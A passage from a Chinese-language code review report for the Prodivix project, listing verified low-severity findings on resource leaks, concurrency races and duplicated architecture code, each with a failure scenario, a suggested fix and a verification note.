- **类别**: resource-leak ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-auth-project-env`

**详情**: `SessionStore.Create` 每次登录插入一行,而没有任何机制删除过期行。唯一的清理语句 `DELETE FROM sessions WHERE expires_at <= NOW()` 是迁移版本 1 的最后一条语句(apps/backend/internal/platform/database/database.go:326),而 `RunMigrations` 会把已应用版本记录进 `schema_migrations` 并在此后跳过它们(database.go:587-591),因此它在一个数据库的生命周期中只执行一次。`SessionStore.Delete` 只删除正在登出的那一个 token。`execution_environment_grants` 同理:`RevokeGrant` 只设置 `revoked_at`,没有任何路径删除过期或已吊销的授权,而 `StartMaintenance`(internal/app/runtime.go:94)只启动 asset-blob 与 secret-key 轮换任务。

**失败场景**: 一个每日 5,000 次登录的部署每年会积累约 180 万行死掉的 `sessions` 记录,每行都在过期后长期保留一个 SHA-256 会话 token 摘要及用户关联;`idx_sessions_expires_at` 索引建了却从未被任何查询使用。`execution_environment_grants` 每次携带机密的 data-gateway 调用(TTL 30 秒)增加一行永久记录,因此一个以 10 req/s 执行携带机密操作的负载每天会新增约 86.4 万行无法删除的授权记录。

**修复建议**: 在 `RuntimeModules.StartMaintenance` 中与现有任务并列添加一个周期性维护任务,以有界批次删除 `sessions WHERE expires_at <= NOW()` 和 `execution_environment_grants WHERE expires_at <= NOW() - <retention>`。

**验证备注**: 已验证。auth/store.go:184-186 每次登录插入一行带 SHA-256 token 摘要的 sessions 记录。唯一基于过期时间的删除语句 `DELETE FROM sessions WHERE expires_at <= NOW()` 是迁移版本 1 的最后一条语句(database.go:328),而 RunMigrations(database.go:585-591)检查 schema_migrations 并对已应用版本执行 `continue`,因此它在每个数据库生命周期内只运行一次。SessionStore.Delete(auth/store.go:237)只是按 token 作用域的登出。对 apps/backend/internal/modules/auth、modules/environment 和 internal/app 全域执行 `git grep 'DELETE FROM'` 只返回那条登出语句——没有任何东西删除过期会话或授权。StartMaintenance(app/runtime.go:94-97)只启动 Workspace asset-blob 维护和 Environment secret-key 轮换维护;key_rotation.go 只暴露 ActiveSecretKeyID/normalizeSecretKeyRotationPolicy/RotateSecretMaterials,不做任何清理。execution_environment_grants 行在每次携带机密的调用时插入(data_gateway.go:725、data_gateway_protocol.go:470、data_gateway_stream.go:596),其延迟执行的 RevokeGrant(store.go:484)只设置 revoked_at。仓库中不存在 pg_cron、运维 cron 或外部清理机制。无界增长确属真实;严重级别 low 是正确的——这是运维/存储层面的劣化,而非数据丢失或安全边界破坏。

##### L-RL-03 `openDataSubscription` 在 await 之后未重新检查 `disposed` 就把流注册进 `activeStreams`,泄漏了桥接会话

- **位置**: [`packages/prodivix-compiler/src/react/standaloneDataRuntime.ts:865`](packages/prodivix-compiler/src/react/standaloneDataRuntime.ts#L865)
- **类别**: resource-leak ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-compiler-targets`

**详情**: `openDataSubscription` 在入口处检查 `disposed`(第 817 行),但随后 await `openRemoteDataStream(...)`(第 836 行),后者会执行一次完整的 postMessage 往返,超时为 30 s。await 之后它无条件执行 `activeStreams.add(session)`。`dispose()` 会设置 `disposed = true`,关闭 `activeStreams` 中当前的每个流,然后调用 `activeStreams.clear()` —— 因此在 `dispose()` 之后才完成打开的会话会被插入一个已被清空的集合,永远不会被关闭。它的 `waitForMessage` `message` 监听器以及父窗口侧的流会在页面剩余生命周期内一直存活。

**失败场景**: 一个绑定订阅的视图挂载并调用 `openDataSubscription`;在打开握手仍在进行时用户离开页面(Vue 根组件的 `onUnmounted` 调用 `workspaceDataRuntime.dispose()` —— `vue/workspaceApp.ts:744`)。握手随后完成,`activeStreams.add(session)` 在已被清空的集合上执行,上游流永远不会被取消:父级网关会一直保持 SSE/AsyncAPI 连接打开,该框架也一直注册着 `message` 监听器。反复进行这样的导航,每次都会累积一个泄漏的流。

**修复建议**: 在 await 之后、注册之前重新检查该标志:`if (disposed) { upstream.close(); throw new DataRuntimeFailure('DATA_RUNTIME_DISPOSED'); } activeStreams.add(session);`

**验证备注**: 代码与所引完全一致:`openDataSubscription` 只在入口处检查 `disposed`(第 817 行),随后 await `loadDataRuntimeManifest()`(第 831 行)和 `openRemoteDataStream(...)`(第 836 行),并在第 865 行无条件执行 `activeStreams.add(session)`,没有任何复查。`dispose()`(第 914-917 行)设置 `disposed = true`,关闭当时存在的流,然后调用 `activeStreams.clear()`;Set 对象本身仍然存活,因此一次迟到的 `add` 会插入一个永远无人关闭的会话,`upstream.close()` 也永远不会被调用。该运行时中其他所有 await 之后的路径都做了复查(第 706 和 719 行的 `if (disposed || snapshots.get(key)?.sequence !== ...)`、第 906 行的 `if (disposed) throw`),这印证了此处的遗漏确实是一处真实的不一致。严重级别已下调:全仓库 `git grep openDataSubscription` 只返回其定义和 packages/prodivix-compiler/src/react/standaloneDataRuntime.test.ts;没有任何渲染器、runtime-core/runtime-browser 端口或生成的 React/Vue 应用代码调用它(生成的 `workspacePirRuntime` 派发中根本没有订阅入口,它只处理 open-url / navigate-route / dispatch-data-operation / call-code)。因此审查者的故障场景需要一个今天在任何生产路径中都不存在的调用方 —— 这是生成的运行时源码中潜伏的 API 面缺陷,而不是已观测到的泄漏。

##### L-RL-04 当远端状态游标持续领先于事件流时,`synchronize` 会在没有延迟和上限的情况下空转

- **位置**: [`packages/runtime-remote/src/remoteExecutionProvider.ts:835`](packages/runtime-remote/src/remoteExecutionProvider.ts#L835)
- **类别**: resource-leak ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-runtime-remote`

**详情**: 内层事件抽取循环结束后,`synchronize` 会重新读取权威记录。如果执行已处于终态但 `cursor < record.latestCursor`,它会立即 `continue` 外层 `while` —— 没有 `await input.delay(...)`,没有尝试计数器,也没有恢复升级。该函数中的其他每一种分歧都会抛出 `RemoteExecutionRecoveryRequiredError`,唯独这一种不会:内层循环只在 `!page.events.length && page.latestCursor > cursor` 时才抛出,因此一个报告 `latestCursor === cursor` 且 `hasMore: false` 的页面会干净地退出内层循环,而外层循环立刻重新进入。

**失败场景**: 远端 `get` 端点报告 `status: 'succeeded', latestCursor: 42`,而 `events.read`(由滞后的只读副本、缓存或不符合规范的 runner 提供)对 `afterCursor: 41` 返回 `{ events: [], latestCursor: 41, hasMore: false }`。`!page.events.length && page.latestCursor > cursor` 为假,因此不会抛出恢复错误;`hasMore` 为假,内层循环退出;`get` 再次报告终态且 `latestCursor 42 > cursor 41`,于是执行 `continue`。此后 provider 会以 100% CPU 在紧密循环中永远背靠背地发出 `events.read` + `get`,而 `controller.job.completion` 永远不会落定 —— 在该页面的整个生命周期内该作业都卡在非终态。

**修复建议**: 记录每次外层迭代开始时观察到的游标;如果一次 `continue` 没有取得进展,要么 `await input.delay(input.pollIntervalMs)` 并把它计入 `maximumReconnectAttempts`,要么抛出 `RemoteExecutionRecoveryRequiredError('Remote terminal status advertises events the stream cannot deliver.', 'events.read')`,交给既有的重连/失败路径处理。

**验证备注**: 证据与 remoteExecutionProvider.ts:832-840 一致。已确认 `continue` 路径上确实没有延迟、没有尝试计数器、也没有恢复升级,并且没有其他上限:active()(第 174 行)只检查作业快照状态,而由于没有事件到达,作业永远不会落定。第 412 行的内层循环守卫只在 `!page.events.length && page.latestCursor > cursor` 时触发,因此一个报告 latestCursor === cursor 且 hasMore:false 的页面会干净退出;remoteExecutionClient.readEvents 中的客户端校验(第 481-511 行)只拒绝**倒退**的 latestCursor(< finalCursor),从不拒绝落后于记录 latestCursor 的值,因此这种自相矛盾的组合是可以表达出来的。严重级别从 medium 降为 low,而且 'resource-leak' 也不太是合适的分类:(a)该 `continue` 是一条刻意的快速重抽路径,而符合规范的那种分歧**是**有守卫的(一个宣称 42 却对 afterCursor 41 返回零事件的服务器会触发 'Remote event replay did not advance to the advertised cursor');要空转必须让 get 与 events.read 互相矛盾,而仓库内的 control plane 做不到这一点(remoteExecutionControlPlane.ts:533-551 从同一条记录提供 latestCursor,postgresExecutionRepository.ts:131 断言 events.length === latestCursor)。(b)“100% CPU”的说法有误 —— 两次调用都在等待网络 I/O,因此真实效果是针对不符合规范或读写分离服务器的无退避、无界轮询循环,而不是 CPU 空转。(c)该循环仍然会在取消时退出。这确实是在一个其余部分处处失败关闭的文件中缺失的一处失败关闭守卫,但只有面对自相矛盾的服务器时才可达。

##### L-RL-05 snapshot blob 在活跃执行配额被强制执行之前就已持久化,而 snapshot 存储没有删除或清扫机制

- **位置**: [`packages/runtime-remote/src/remoteExecutionControlPlane.ts:389`](packages/runtime-remote/src/remoteExecutionControlPlane.ts#L389)
- **类别**: resource-leak ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-runtime-remote`

**详情**: `handleCreate` 先调用 `options.snapshots.put(...)` —— 在 Postgres 适配器中,这会把完整的 `ExecutableProjectSnapshot` 插入 `remote_execution_snapshot_blobs` 并写入一条属主授权行 —— 然后才由 `options.repository.createOrGet(...)` 执行真正的活跃执行配额检查(`Number(active?.count ?? 0) >= input.maximumActiveExecutions -> quota-exceeded`)。随包提供的 `createActiveExecutionQuotaPolicy` 始终返回 `allowed: true`,因此更早的 `quota.check` 从不拒绝;仓储是唯一的强制点。`RemoteExecutionSnapshotStore` 只暴露 `put`/`get`(remoteExecutionControlPlane.types.ts:74-85)—— 任何地方都没有删除、过期列或清扫机制(对比 artifact 的 `sweepExpiredArtifacts`),因此在一次被拒绝的 create 上写入的 snapshot 会被永久保留且零引用。

**失败场景**: 一个已认证主体在其活跃执行配额已满的情况下反复 POST `create`,每次都带一个不同的上传 snapshot(任何一个字节的文件改动都会产生新的 `contentDigest`,因而产生新的 `(snapshot_id, content_digest)` 主键)。每个请求都通过 `quota.check`,把完整的项目 snapshot JSON 写入 `remote_execution_snapshot_blobs` 并写入一条属主授权行,之后才从 `createOrGet` 拿到 `quota-exceeded`。不会创建任何执行行,也没有任何机制删除该 blob,因此客户端可以在从不超出其执行配额的前提下,无界地增长 control plane 的数据库存储(每个请求只受 `EXECUTABLE_PROJECT_LIMITS` 的限制)。

**修复建议**: 在持久化上传的 snapshot 之前先强制执行活跃执行计数检查(调用 `repository.countActive(principal.subjectId)` 并提前拒绝),和/或为 `RemoteExecutionSnapshotStore` 增加基于 `storedAt` 的清扫机制,在保留窗口过后删除没有 `remote_executions` 引用行的授权/blob,与 `sweepExpiredArtifacts` 保持一致。

**验证备注**: 所有引用的事实都成立。remoteExecutionControlPlane.ts:quota.check 在 382-384,snapshots.put 在 389,repository.createOrGet 在 416,而唯一真正的配额拒绝在 430-431(由 postgresExecutionRepository.ts:303-304 和 remoteExecutionControlPlaneMemory.ts:203 支撑)—— 因此 blob 写入确实先于唯一的强制点。createActiveExecutionQuotaPolicy(同一文件,713-729)确实无条件返回 allowed:true,而 main.ts:219 在生产中接入了它。postgresSnapshotStore.ts:44-82 插入 blob 和属主授权行。RemoteExecutionSnapshotStore(types.ts:73-85)只有 put/get;在 runtime-remote-postgres 上 git grep 只找到针对 server authority、artifact 授权/blob、终态会话和区域 operator 授权的 DELETE FROM —— 没有 snapshot 删除,schema.ts:4-12 中没有过期列,也没有清扫。该路径在生产中可达:apps/web 始终经由 Go 代理发送 kind:'upload'(blueprintProjectRunnerClient.ts:215、projectTestExecutionClient.ts:67),而该代理自身不强制任何配额。严重级别下调为 low:顺序不能简单对调(remote_executions 对 blob 表有外键,schema.ts:49-50,所以 blob 必须先存在),而且**任何**路径下都不存在 snapshot GC —— 成功执行的 blob 和执行行同样被永久保留 —— 因此这是在既有的无界保留之上再增加一些孤儿数据,并且按内容摘要去重,每个请求受 64 MB 公共请求体上限和 EXECUTABLE_PROJECT_LIMITS 限制,只有在经过认证的后端代理之后才可达,对正确性、完整性或 secret 暴露均无影响。真正的修复是孤儿清扫,而不是调整顺序。

#### 4.4.7 并发(concurrency)

##### L-CC-01 Palette 插入基于 React 渲染闭包的快照规划整个 `/ui/graph` 的 replace,且没有 revision 守卫,会静默丢弃并发编辑

- **位置**: [`apps/web/src/editor/features/blueprint/editor/controller/useBlueprintEditorController.ts:584`](apps/web/src/editor/features/blueprint/editor/controller/useBlueprintEditorController.ts#L584)
- **类别**: concurrency ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-blueprint`

**详情**: `insertPaletteItem` 从渲染闭包中读取 `workspace`,解码文档,并调用 `applyPaletteItemInsertion`,后者产出一个 `WorkspaceCommandEnvelope`,其 `forwardOps` 是根据该快照计算出的单个 `{op:'replace', path:'/ui/graph', value: <whole graph>}`(paletteCreation.ts:511-515)。`WorkspaceCommandEnvelope` 没有 base revision 字段(workspaceCommand.ts:46-62),而 `dispatchWorkspaceCommand` 会把它原样应用到当时的 `state.workspace` 上(editorStore.workspaceSlice.ts:351-355)。这次分发是异步的 —— `enqueueWorkspaceOperationOutboxAndDispatch` 会在乐观应用之前 await `store.enqueue`(IndexedDB)—— 因此在那次往返完成之前,store(以及 React 闭包)都不会更新。该文件中其他所有 Blueprint 变更都走 Transaction 规划器,在 `baseRevision !== workspace.workspaceRev` 时失败关闭;同级的 inspector 控制器也正是出于这个原因在规划前特意重新读取 `useEditorStore.getState().workspace`(useBlueprintEditorInspectorController.ts:431-437);而 palette 这条路径两者都没做。

**失败场景**: 作者在 palette 中双击 `Button` 卡片(SidebarComponentList.tsx:150 `onDoubleClick` -> `onAddComponent`),速度快于 IndexedDB 入队完成。两次调用看到的是同一个 `workspace` 和同一份 `read.decodedContent`;`createNodeIdFactory` 因此为两者都生成 `pdxbutton-1`,而第二个 `replace /ui/graph` 会覆盖第一个产生的图。结果是只出现一个按钮而不是两个,并且第二条命令的 `reverseOps` 恢复的是第一次插入*之前*的图,所以一次撤销也会把幸存的那个节点一起删除。如果在这个窗口内有任何其他界面(Inspector 字段提交、Code 编辑器、AI 操作)落到同一个 PIR 文档上,同样会发生覆盖。

**修复建议**: 在 `insertPaletteItem` 内部重新读取实时快照(`const source = useEditorStore.getState().workspace`)再解析放置位置并做规划,做法与 `applySelectedNodeUpdate` 完全一致;并把插入操作改走 `createWorkspacePIRGraphFragmentInsertTransactionPlan`(它已经携带 `baseRevision` 且会失败关闭),而不是手工拼一个裸的 `WorkspaceCommandEnvelope`。

**验证备注**: 原始机制是真实的,但该结论的核心差异点是错误的,因此严重性被严重夸大。已验证为真的部分:insertPaletteItem(useBlueprintEditorController.ts:568-599)读取渲染闭包中的 `workspace`,paletteCreation.ts:511-515 产出整图的 {op:'replace', path:'/ui/graph'},WorkspaceCommandEnvelope(workspaceCommand.ts:46-62)不携带 base revision,enqueueWorkspaceOperationOutboxAndDispatch 在分发前 await store.enqueue(workspaceVfsOutboxExecutor.ts:44),dispatchWorkspaceCommand 无 CAS 地应用到实时的 state.workspace 上,SidebarComponentList.tsx:150 绑定的 onDoubleClick 没有在途守卫。但被推翻的是"该文件中其他所有 Blueprint 变更都走 Transaction 规划器并在 baseRevision !== workspace.workspaceRev 时失败关闭"这一说法:createWorkspacePIRElementUpdateTransactionPlan 发出的是完全相同的整图 replace(workspacePirGraphAuthoringTransaction.ts:353-357),而其第 149-155 行的守卫比较的是 input.baseRevision 与 input.workspace.workspaceRev —— 两者都来自同一个陈旧的闭包对象,因此永远无法检测出 store 的陈旧;applyWorkspaceTransaction(workspaceCommand.ts:1749-1838)也从不针对实时快照重新校验 baseRevision。同一文件中的 deleteTreeNode(第 501 行)、duplicateTreeNode(545-559)和 moveTreeNode 使用的都是同一个闭包快照。唯一真正的不对称是 inspector 控制器在第 431-433 行的 getState() 重读。综上:这是一个全仓库范围的"最后写入者获胜"式乐观应用设计,竞态窗口为一次 IndexedDB 入队,而不是 palette 特有的高危并发缺陷。

##### L-CC-02 Outbox 入队在异步写入之后只重新校验 workspace id,导致条目的 baseSnapshot 可能与 Command 实际应用到的 snapshot 不一致

- **位置**: [`apps/web/src/editor/workspaceSync/workspaceVfsOutboxExecutor.ts:46`](apps/web/src/editor/workspaceSync/workspaceVfsOutboxExecutor.ts#L46)
- **类别**: concurrency ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-store-sync`

**详情**: `createWorkspaceOutboxEntry` 捕获 `baseSnapshot: input.workspace`,随后 `await store.enqueue(...)` 把控制权让给 IndexedDB 事件循环。恢复执行时,守卫只比较 `state.workspace.id !== input.workspace.id`,而不比较 snapshot 标识或 `workspaceRev`/`opSeq`。紧接着的乐观应用使用 `state.dispatchWorkspaceCommand`,它在内部读取*当前*的 store snapshot。于是持久化条目可能基于 revision N,而它所镜像的 Command 却被应用到 revision N+1,破坏了 outbox 所依赖的因果链(每个条目的 `expectedWorkspaceRev` 必须等于上一个条目在服务端留下的 rev)。

**失败场景**: 两个界面并发派发——例如 inspector 提交一次属性变更的同时,`useExecutionFilesystemChanges` 或画布派发了自己的操作。派发 A 的 `store.enqueue` 先解析并应用其 Command(本地 rev 1 -> 2)。派发 B 的 `enqueue` 早已在途、其 `baseSnapshot` 停留在 rev 1,它通过了只比较 id 的守卫并应用自己的 Command(rev 2 -> 3)。排空时,条目 A 以 `expectedWorkspaceRev: 1` 提交,服务端推进到 rev 2;条目 B 也以 `expectedWorkspaceRev: 1` 提交,得到 409。随后 `recoverClaimedEntry` 以 base=rev1、local=rev1+B、remote=rev1+A 做三方合并。如果 A 和 B 触及同一文档路径(对同一组件属性的两次快速编辑),`analyzeWorkspaceThreeWay` 就会报告冲突,用户会为自己连续的两次编辑看到一个 revision 冲突对话框。

**修复建议**: 比较 snapshot 标识/revision,而不只是 id:当 `state.workspace !== input.workspace`(或 `state.workspace.opSeq !== input.workspace.opSeq`)时拒绝;或者在入队点之后用 `useEditorStore.getState().workspace` 构建 outbox 条目,使 `baseSnapshot` 与被乐观应用的 snapshot 始终处于同一 revision。另外注意 `store.remove(created.entry.id)` 调用时没有传 `expectedLeaseOwnerId`,因此它会删除另一次排空已经认领并发送出去的条目。

**验证备注**: 机制与描述完全一致:workspaceVfsOutboxExecutor.ts:30-34 在 `await store.enqueue` 之前捕获 baseSnapshot,第 46 行只重新检查 `state.workspace.id`;dispatchWorkspaceCommand/Transaction(editorStore.workspaceSlice.ts:351-396)应用到当前 store snapshot 且没有 revision 前置条件,而提交用的 CAS 向量来自条目自身的 base(planWorkspaceOperationCommit,packages/workspace-sync/src/workspaceOperationCommit.ts:297-307)。没有互斥量或队列对远程编辑派发做串行化(只有本地项目有 serializeLocalCommit),而调用点约有 20 处相互独立,因此重叠是可达的;一旦两次派发同时在途,IndexedDB 的事务串行化会让交错变得确定性。不过所声称的影响被夸大了。CAS 向量按文档分区(只有当 workspace 级状态变化时才包含 workspaceRev),因此对不同文档的并发操作即使 base 相同也能干净提交;发生重叠时会得到 409,而 recoverClaimedEntry 会透明地自动 rebase,只有当两个操作以不同取值改写同一 JSON 路径时才会出现冲突会话。而这种同路径冲突即便没有这个守卫问题也会通过 adoptRebasedWorkspaceOperation(workspaceSlice.ts:440-476)独立发生——只要用户在一次提交在途期间再次编辑同一路径即可,因此该守卫并非唯一成因。没有数据丢失或损坏——只是额外的往返加上偶发的误报冲突对话框。严重度修正为 low。

##### L-CC-03 `CREATE TABLE IF NOT EXISTS schema_migrations` 在获取 advisory lock 之前执行,导致并发首次启动出现竞态

- **位置**: [`apps/backend/internal/platform/database/database.go:576`](apps/backend/internal/platform/database/database.go#L576)
- **类别**: concurrency ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-platform`

**详情**: 迁移注册表在 `pg_advisory_xact_lock` 对迁移过程做串行化之前就已创建。PostgreSQL 的 `CREATE TABLE IF NOT EXISTS` 并非并发安全:两个都发现表不存在的事务会同时尝试插入系统目录,失败的一方会因 `pg_type_typname_nsp_index` 上的唯一约束冲突而中止,而不是静默成功。该函数中其他所有 DDL 语句都正确地位于锁内;只有注册表创建语句和加锁语句本身在锁外。

**失败场景**: 首次部署针对一个空数据库同时拉起 3 个副本。三者都开启事务,并在任何一方到达 advisory lock 之前执行 `CREATE TABLE IF NOT EXISTS schema_migrations`。其中一个提交成功;另外两个以 `duplicate key value violates unique constraint "pg_type_typname_nsp_index"` 失败,RunMigrations 返回 "create migration registry: ...",OpenDatabase 失败,这两个 pod 会持续崩溃重启,直到编排器恰好在获胜者提交之后重启它们。

**修复建议**: 把 `pg_advisory_xact_lock` 作为事务中的第一条语句获取,然后再创建注册表。

**验证备注**: 证据与 apps/backend/internal/platform/database/database.go 原样吻合:第 576 行的 CREATE TABLE IF NOT EXISTS schema_migrations、第 583 行的 SELECT pg_advisory_xact_lock($1) —— 注册表 DDL 确实先于加锁,而后续每一条 DDL 都在锁内。对 PostgreSQL 语义的解读正确:CREATE TABLE IF NOT EXISTS 在文档中即被标注为易发生竞态;未看到最新系统目录 snapshot 的并发创建者会继续执行 heap_create_with_catalog,在 pg_type/pg_class 唯一索引上阻塞等待获胜者的 xid,随后报出 duplicate key value violates unique constraint。由于全部 13 个迁移都在这一个事务内运行,失败方要等整个迁移过程跑完才会报错,因此窗口很宽而非很窄。该路径是真实的生产代码:OpenDatabase(database.go:40)调用 RunMigrations,其错误会关闭 db 并经 backend.NewServer 传播到 apps/backend/cmd/server/main.go 中的 log.Fatal。没有任何守卫 —— database_test.go:18-19 的 sqlmock 测试实际上固化了这个错误的顺序,而不是阻止它。严重级别由 medium 下调为 low:该故障仅出现在针对空数据库的首次启动,属于瞬时启动中止,一旦表存在,下次重启即可自愈(此后锁会把一切串行化),不会造成数据丢失或损坏。

##### L-CC-04 激活事务在整个耗时数秒的运行时激活期间锁定全局注册表 revision,导致无关插件迫使其完全重新激活

- **位置**: [`packages/plugin-host/src/lifecycle/runtimeLifecycle.ts:390`](packages/plugin-host/src/lifecycle/runtimeLifecycle.ts#L390)
- **类别**: concurrency ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-plugin-host`

**详情**: `beginTransaction` 在 await `context.options.runtimeAdapter.activate(...)` 之前捕获 `expectedRegistryRevision: context.registry.getRevision()`,而对浏览器适配器而言这一 await 跨越了 iframe 创建、sandbox 握手(`handshakeTimeoutMs`)和 `runtime/activate` RPC(`lifecycleTimeoutMs`)——数秒之久。`revision` 是 `createContributionRegistry` 中由所有插件共享的单个闭包变量,而 `commit()` 只要它发生变化就以 `TRANSACTION_CONFLICT` 失败。`PluginOperationCoordinator` 只按 pluginId 串行化,因此并发激活之间并不互斥。每次冲突都会通过 `deactivateLateRuntimeSession` 拆掉刚刚构建好的运行时并重跑整个激活流程,上限为 `MAX_ACTIVATION_TRANSACTION_ATTEMPTS = 3`。

**失败场景**: `await Promise.all([host.activate('a', ev), host.activate('b', ev), host.activate('c', ev), host.activate('d', ev)])`,其中每个插件至少注册一项激活期贡献。插件 `a` 提交并推进 `revision`;`b`、`c`、`d` 仍在 `runtimeAdapter.activate` 之中,因此它们的提交全部触发 TRANSACTION_CONFLICT,丢弃一个已完整启动的 sandbox 并重试。当有四个或更多激活重叠时,某个插件可能耗尽全部三次尝试并返回 'Plugin activation exhausted its contribution transaction retries.' 失败,而实际上一切正常。

**修复建议**: 在 `runtimeAdapter.activate` 完成之后再开启事务(把运行时的注册暂存到缓冲区,再重放进一个新开启的事务),或者把乐观 revision 检查的范围收窄到所有者自身的注册,而不是全进程的注册表 revision。

**验证备注**: 四项机制前提全部成立。(1)runtimeLifecycle.ts:390-396 在 :418-445 await `context.options.runtimeAdapter.activate(...)` 之前捕获了 `expectedRegistryRevision: context.registry.getRevision()`。(2)contributionRegistry.ts 使用单个闭包作用域的 `let revision = 0`(:193),任何暂存或移除内容的提交(:466)以及 `removeEntries`(:519)都会推进它,而 `commit()` 在 `revision !== context.expectedRegistryRevision` 时以可重试的 TRANSACTION_CONFLICT 失败(:374-385);diagnostics.ts:320-325 确认 `retryable: true`。(3)operationCoordinator.ts 按 `pluginId` 划分其串行化队列,因此不同插件的激活可以自由重叠。(4)冲突时会通过 `deactivateLateRuntimeSession`(:481-484)拆掉刚构建的会话并重跑整个 activate,上限为 MAX_ACTIVATION_TRANSACTION_ATTEMPTS = 3(:48)。在 N 个同时激活的情况下,每一轮恰好只有一个能提交,因此第 4 个插件确实会耗尽重试。一处叙述错误:耗尽重试的插件实际返回的是 :492-501 处提交自身的 TRANSACTION_CONFLICT 诊断,而不是 :525 处的 'Plugin activation exhausted its contribution transaction retries.' 消息——该分支不可达,因为所有未成功提交的路径都会先行返回。严重级别由 medium 下调为 low:`host.activate` 在 packages/plugin-host/src/**tests**/pluginHostLifecycle.test.ts 之外没有任何调用方(apps/web 的 WebPluginPlatform 接口只暴露 install/discover/disable/getSnapshot/listSnapshots),因此并发的多插件激活从任何已发布的界面都不可达;这是库 API 中一个过宽的乐观并发作用域,属于潜在问题。

#### 4.4.8 架构不变量(architecture-invariant)

##### L-ARCH-01 Canonical 执行 snapshot 标识在 apps/web 与 @prodivix/prodivix-compiler 之间重复实现

- **位置**: [`apps/web/src/editor/features/execution/workspaceExecutionIdentity.ts:11`](apps/web/src/editor/features/execution/workspaceExecutionIdentity.ts#L11)
- **类别**: architecture-invariant ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-execution`

**详情**: 此处的 `createWorkspaceExecutionSnapshotId` / `createWorkspaceExecutionSnapshotRef` 逐字节重新实现了已由 `packages/prodivix-compiler/src/executableProject/workspaceExecutableProject.ts:131`(`createWorkspaceExecutionSnapshotRef`,从 `@prodivix/prodivix-compiler` 导出)拥有的同一语义。apps/web 应当是组合根,而不是传输中立领域契约的所有者。这两份副本对相等性判断是承重的:`ExecutionCenter.tsx:242`(`sessionSnapshotStale`)、`ProjectTestingPage.tsx:74`(`reportIsCurrent`)和 `workspaceExecutionSourceNavigation.ts:26`(`snapshot-stale` 门禁)都把 apps/web 的字符串与由编译器副本产出的 snapshotId 做比较。apps/web 的版本已经在一处产生了漂移:`createWorkspaceExecutionPartitionRevisions` 未排序地遍历 `Object.values(workspace.docsById)`,而编译器会先对文档排序。

**失败场景**: 今后对任一副本的任何修改(例如更改分隔符、新增一个分区,或只在一处把 `localeCompare` 换成稳定比较器)都会使同一 workspace revision 产生两个不同的字符串。届时每一次源码追溯点击都会返回 `{status:'unavailable', reason:'snapshot-stale'}`,Execution Center 会永久显示陈旧 snapshot 徽标,Testing 页面会永久把刚产出的报告标注为 `testing.report.outdated`——而且不会有任何测试失败,因为没有测试比较这两份实现。

**修复建议**: 删除 apps/web 的实现,改为从 `@prodivix/prodivix-compiler` 重新导出 `createWorkspaceExecutionSnapshotRef`(以及派生的 `snapshotId` 访问器),使执行 snapshot 标识只有唯一的所有者。

**验证备注**: 重复是真实存在的:workspaceExecutionIdentity.ts:11-45 复刻了已由 packages/prodivix-compiler/src/executableProject/workspaceExecutableProject.ts:130-155 拥有的完全相同的 snapshotId 模板和分区 revision 映射,而后者在 packages/prodivix-compiler/src/index.ts:84 公开导出,且 apps/web 已经导入过它(workspaceIssueProviders.ts:27),因此这份副本没有任何依赖或分层上的理由。这违反了不变量 9(应用不得重新拥有传输中立的领域契约)以及 alpha 阶段的“不得有重复所有者”规则。跨实现的相等性在生产中确实是承重的,还包括审查者漏掉的一处:BlueprintProjectRunnerSurface.tsx:60-62 把 state.activeSnapshotId(由编译器经 plan.request.workspace.snapshotId 产出,useBlueprintProjectRunner.ts:202)与 state.authoringSnapshotId(apps/web 副本,第 71 行)做比较;workspaceIssueProviders.ts:345 用编译器函数计算 expectedSnapshotId,再与由 apps/web 副本产出的会话 snapshotId 比较(nodeGraphExecutionClient.ts:81、animationExecutionClient.ts:98)。但我否证了审查者“已经漂移”的论据,并据此下调严重度:snapshotId 的计算是完全相同的(两者都按 id.localeCompare 排序并使用相同模板),而 createWorkspaceExecutionPartitionRevisions 中未排序的 Object.values 在行为上是惰性的,因为每个消费方都会先归一化键序——executableProjectNormalization.ts:683-693 通过 compareExecutableProjectText 对分区条目排序,rootlessPodmanSandbox.ts:718-719 在 JSON.stringify 比较之前先应用 normalizeRevisions。因此当前不存在错误行为,也不存在现实故障;所陈述的失败场景明确是面向未来的假设(“今后对任一副本的任何修改”)。这是可维护性/所有权缺陷,而不是现存的正确性缺陷,因此 medium 站不住脚。

##### L-ARCH-02 组件删除/重命名 planner 使用了明确不做校验的 VFS 边界,且从未对产出的 Transaction 做校验

- **位置**: [`packages/workspace/src/component/workspaceComponentImpactPlanner.ts:387`](packages/workspace/src/component/workspaceComponentImpactPlanner.ts#L387)
- **类别**: architecture-invariant ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-workspace`

**详情**: `createWorkspaceVfsIntentCommandPlan` 的文档说明它只负责物化 Command,"without choosing a domain validation policy",其契约是"versioned domain planners use this boundary and validate the resulting transaction through the canonical Workspace policy"。它仅有的两个消费方是 `createWorkspaceComponentRenameTransactionPlan`(第 387 行)和 `createWorkspaceComponentDeleteTransactionPlan`(第 156 行),而两者都从未对产出的 Transaction 调用 `applyWorkspaceCommand`/`applyWorkspaceTransaction`。所有同类 planner 都遵守了该契约(`createWorkspaceComponentExtractionTransactionPlan` 会调用 `applyWorkspaceTransaction`;`data/workspacePirDataOperationBindingTransaction.completePlan` 会做一次试运行的 `applyWorkspaceTransaction`;`createWorkspaceCodeArtifactRelocationPlan` 使用会校验的 `createWorkspaceVfsIntentPlan`)。结果是:这两个 planner 会对 Canonical Workspace 必然拒绝的 Transaction 报告 `status: 'ready'`。

